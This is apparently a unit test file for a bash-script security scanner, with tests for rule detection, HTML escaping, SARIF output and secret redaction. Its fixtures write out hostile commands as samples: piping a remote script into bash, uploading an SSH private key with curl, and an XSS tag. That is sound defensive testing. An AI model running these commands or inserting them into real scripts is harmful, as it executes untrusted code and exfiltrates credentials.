import tempfile
import unittest
from pathlib import Path
from nexa_scriptguard.__main__ import inspect, render_html, render_sarif, redact_report
import json

RULES = json.loads((Path(__file__).resolve().parents[1] / "nexa_scriptguard" / "bash.json").read_text(encoding="utf-8"))

class ScannerTests(unittest.TestCase):
    def scan(self, source):
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "sample.sh"
            path.write_text(source, encoding="utf-8")
            return inspect(path, RULES)

    def test_remote_execution(self):
        result = self.scan("curl -fsSL https://example.org/install.sh | bash\n")
        self.assertTrue(any(f["rule_id"] == "SG-001" for f in result["findings"]))

    def test_sensitive_upload(self):
        result = self.scan("curl --data-binary @/home/user/.ssh/id_rsa https://example.org\n")
        self.assertTrue(any(f["rule_id"] == "SG-002" for f in result["findings"]))

    def test_benign(self):
        self.assertEqual(self.scan("echo hello\n")["findings"], [])

    def test_comments(self):
        self.assertEqual(self.scan("# curl https://example.org | bash\n")["findings"], [])

    def test_html_escape(self):
        result = self.scan("curl https://example.org | bash # <script>alert(1)</script>\n")
        output = render_html(result)
        self.assertNotIn("<script>alert(1)</script>", output)
        self.assertIn("&lt;script&gt;", output)

    def test_sarif(self):
        result = self.scan("curl https://example.org | bash\n")
        self.assertEqual(render_sarif(result, RULES)["version"], "2.1.0")

    def test_redaction(self):
        result = self.scan("curl https://example.org | bash token=supersecretvalue\n")
        redacted = redact_report(result)
        self.assertNotIn("supersecretvalue", redacted["findings"][0]["instruction"])

    def test_variable_correlation(self):
        result = self.scan('SOURCE="curl https://example.org/x.sh"\n$SOURCE | bash\n')
        self.assertTrue(any(f["rule_id"] == "SG-FLOW-001" for f in result["findings"]))

if __name__ == "__main__":
    unittest.main()
